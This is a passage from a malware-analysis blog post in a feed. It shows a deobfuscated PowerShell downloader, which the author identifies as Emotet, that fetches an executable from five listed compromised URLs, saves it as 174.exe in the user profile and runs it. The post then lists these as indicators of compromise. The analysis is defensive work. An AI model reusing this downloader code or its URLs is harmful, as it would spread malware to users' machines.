&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$iA_BoD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new-object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Net.WebClient&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iAUCAD1A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://thanhphotrithuc.com/wp-admin/3bL/@https://www.gcwhoopee.com/cgi-bin/t28/@https://thinknik.ca/wp-includes/FY3B/@https://tinydownload.net/wp-admin/1r41/@http://tr.capers.co/xjoma8v/jb/'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'@'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QAkAUA&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'174'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;userprofile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QAkAUA&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.exe'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$XXQZoB&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iAUCAD1A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$iA_BoD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DownloadFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$XXQZoB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;If&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Get-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-ge&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Invoke-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SBAAQZ&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can see a couple more things. First, the download is saved as 174.exe in the root of the user’s profile. Second, the URLs are tried one at a time until the download file size is greater than 40KB, and if not it moves to the next URL in the list.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;So with a little bit of extra work, we’ve come up with several more IOCs that we would have otherwise missed. And in case you were wondering, this malware sample turned out to be Emotet after doing some OSINT searches for the URLs discovered.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;C:\Users&amp;lt;userprofile&amp;gt;\174.exe&lt;/li&gt;
  &lt;li&gt;https://thanhphotrithuc.com/wp-admin/3bL/&lt;/li&gt;
  &lt;li&gt;https://www.gcwhoopee.com/cgi-bin/t28/&lt;/li&gt;
  &lt;li&gt;https://thinknik.ca/wp-includes/FY3B/&lt;/li&gt;
  &lt;li&gt;https://tinydownload.net/wp-admin/1r41/&lt;/li&gt;
  &lt;li&gt;http://tr.capers.co/xjoma8v/jb/&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Jeremiah Bess</name></author><category term="Analysis" /><summary type="html">Often times malware analysis is considered complete when you run the badness in a sandboxed VM and gather the network IOCs observed. However, we can gain a better list of indicators by spending a little extra time on our analysis, as I hope this post will demonstrate as I walk through some simple PowerShell decoding.</summary></entry></feed>